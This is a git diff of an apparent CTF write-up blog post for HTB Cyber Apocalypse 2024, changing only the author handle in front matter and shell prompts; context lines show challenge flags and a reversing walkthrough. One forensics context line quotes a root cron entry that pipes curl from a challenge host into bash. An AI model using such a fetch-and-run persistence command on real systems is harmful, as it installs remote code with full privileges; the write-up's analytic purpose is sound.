@@ -1,5 +1,5 @@
 ---
-author: pl4int3xt
+author: 0xbinder
 layout: post
 title: Cyber Apocalypse 2024
 date: '2024-03-09'
@@ -155,7 +155,7 @@ print(original_flag)
 Running the script we get the flag
 
 ```shell
-pl4int3xt@archlinux ~/D/cyberapocalypse> python3 decrypt.py
+0xbinder@archlinux ~/D/cyberapocalypse> python3 decrypt.py
 HTB{4_b3tTeR_w3apOn_i5_n3edeD!?!}
 ```
 ## Forensics
@@ -185,7 +185,7 @@ echo "*/5 * * * * root curl -s http://legions.korp.htb/0xda4.0xda4.$ARCH | bash 
 decoding the string we get the second part
 
 ```sh
-pl4int3xt@archlinux ~> echo 'NG5kX3kwdVJfR3IwdU5kISF9' | base64 -d
+0xbinder@archlinux ~> echo 'NG5kX3kwdVJfR3IwdU5kISF9' | base64 -d
 4nd_y0uR_Gr0uNd!!}
 ```
 
@@ -249,7 +249,7 @@ Finally we get our flag
 ## Reverse 
 ### LootStash
 
-Hold your horses, before spamming 'strings' command let the binary whisper its secrets in the language of assembly and the flag will unfold its tale in the dance of opcodes pirouetting into your arms. 😄 😄 😄.Always seek to understand the binary before running strings. `#pl4int3xt😄`
+Hold your horses, before spamming 'strings' command let the binary whisper its secrets in the language of assembly and the flag will unfold its tale in the dance of opcodes pirouetting into your arms. 😄 😄 😄.Always seek to understand the binary before running strings. `#0xbinder😄`
 ```c
 undefined8 main(void)
 
@@ -274,7 +274,7 @@ undefined8 main(void)
 ```
 
 ```shell
-pl4int3xt@archlinux ~/D/c/rev_lootstash> ./stash
+0xbinder@archlinux ~/D/c/rev_lootstash> ./stash
 Diving into the stash - let's see what we can find.
 .....
 You got: 'Snowfall, Aspect of the Occult'. Now run, before anyone tries to steal it!
@@ -283,7 +283,7 @@ You got: 'Snowfall, Aspect of the Occult'. Now run, before anyone tries to steal
 The binary gets the current time and stores it in the variable, it then seeds the random number generator `(rand())` with the current time. This helps to generate different random numbers in each run of the program. The random strings are coming from the gear array. This means that they are all stored at the `.data` section of the binary. Finally let's run strings and grep for the flag.
 
 ```shell
-pl4int3xt@archlinux ~/D/c/rev_lootstash> strings stash | grep 'HTB'
+0xbinder@archlinux ~/D/c/rev_lootstash> strings stash | grep 'HTB'
 HTB{n33dl3_1n_a_l00t_stack}
 ```
 ![img-description](cyber-apocalypse-2024.png)
